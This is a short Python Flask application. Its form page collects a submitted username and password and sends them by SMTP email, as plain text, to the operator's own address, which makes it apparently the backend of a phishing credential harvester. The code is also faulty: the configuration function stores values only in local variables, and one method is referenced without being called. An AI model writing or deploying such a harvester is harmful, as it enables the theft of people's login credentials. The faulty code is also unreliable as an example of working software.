from flask import Flask, render_template, request
import smtplib

logic = Flask(__name__)

#Read the variables in variables.txt and store them in a list
def getConfigVariables():
	file_obj = open('variables.txt', 'r')
	index = 0
	SMTPInformation = list()

	for line in file_obj:
		SMTPInformation.append((line.split(':'))[1].strip())

	#Assign the variables names for concise access
	senderEmail = SMTPInformation[0]
	senderPassword = SMTPInformation[1]
	senderServer = SMTPInformation[2]
	senderPort = SMTPInformation[3]

#The method that sets up the SMTP connection and sends the credentials.
def sendCredentials(user, password):
	#Set message to a formatted String that includes the email header and content
	message = 'From: Form Submission <'+senderEmail+'>\nTo: Form Reception <'+senderEmail+'>'+'\nSubject: Form Submission\n\n'+'Username = '+user+' Password = '+password
	#Open the connection and send the credentials
	server = smtplib.SMTP(senderServer+':'+senderPort)
	server.ehlo
	server.starttls()
	server.login(senderEmail,senderPassword)
	server.sendmail(senderEmail, senderEmail, message)
	server.quit() #Close the connection

#Index page for debugging (Not sure how implement that functionality)
@logic.route('/index')
def index():
	return render_template("index.html")

#Form page that includes the functionality as well as a reference to the HTML template
@logic.route('/form_page', methods=['POST', 'GET'])
def formPage():
	if request.method == 'POST':
		#Get the variables from the POST request
		username = request.form['username']
		password = request.form['password']
		getConfigVariables()
		sendCredentials(username, password) 
		return render_template("simple_form.html")

	else:

		return render_template("simple_form.html")

if __name__ == "__main__":

	logic.run()


